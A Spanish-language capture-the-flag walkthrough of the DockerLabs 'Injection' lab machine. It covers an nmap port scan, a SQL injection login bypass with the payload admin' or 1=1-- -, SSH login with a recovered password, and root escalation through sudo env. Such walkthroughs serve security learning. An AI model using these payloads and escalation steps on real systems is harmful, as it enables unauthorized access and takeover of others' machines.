# Máquina Injection

Dificultad -> Muy fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

--------------
## Explotación

Accedemos a la web y encontramos un **panel de login**. Por el nombre de la máquina, intentamos explotarlo con una **SQL Injection**.

Introduciendo "**admin' or 1=1-- -**" para que siempre sea verdadero, y cualquier cosa en la **password**.

![Pasted image 20240512225902](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/4d8121f1-f8ab-4b0a-9fd9-ce0101d1c16c)

Conseguimos bypasearlo exitosamente!

![Pasted image 20240512230123](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/71d8d288-ede1-4bc6-a8c7-2dc74f84110c)

```
KJSDFG789FGSDF78
```

Probamos esta contraseña con el usuario **dylan** en el protocolo **ssh**.

```shell
ssh dylan@172.17.0.2
```

Estamos dentro !

------------------------------
## Escalada de privilegios

Vemos que podemos ejecutar **env** como el usuario **root**.
Será tan sencillo como ejecutar:

```shell
sudo /usr/bin/env /bin/bash
```

```shell
whoami
------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema!
